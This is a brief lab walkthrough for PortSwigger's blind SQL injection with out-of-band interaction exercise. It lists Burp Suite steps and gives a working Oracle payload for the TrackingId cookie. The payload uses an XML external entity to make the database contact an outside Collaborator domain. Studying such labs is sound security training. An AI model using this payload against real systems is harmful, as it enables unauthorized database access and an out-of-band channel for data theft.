# Blind SQL Injection with Out-of-Band Interaction - [Link](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band)

**Goal**: Exploit a blind SQL injection vulnerability to cause a DNS lookup to Burp Collaborator.
This lab contains a **blind SQL injection** in a tracking cookie. The SQL query is executed **asynchronously**, meaning it has no visible effect on the web response, and standard techniques like error-based or time-based SQLi do not work. However, out-of-band (OAST) techniques can be used to detect the vulnerability.
The goal is to trigger a **DNS request** to a domain controlled by the attacker (provided by Burp Collaborator).


### Steps

1. **Open Burp Suite Professional** and go to the **Burp Collaborator** tab.
2. Click **"Copy to clipboard"** to get your unique Collaborator subdomain.
   Example used here:

   ```
   tyv5h87zihzv3uoz597yjywha8gz4vsk.oastify.com
   ```
3. Visit the lab in your browser with Burp running.
4. Locate the `TrackingId` cookie in the request and inject the following payload (Oracle-specific):

   ```
   ' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://tyv5h87zihzv3uoz597yjywha8gz4vsk.oastify.com/"> %remote;]>'),'/l') FROM dual)--
   ```
5. Send the request.
6. Go back to **Burp Collaborator**, click **"Poll now"**, and check for incoming DNS interactions.


The lab is successfully solved.
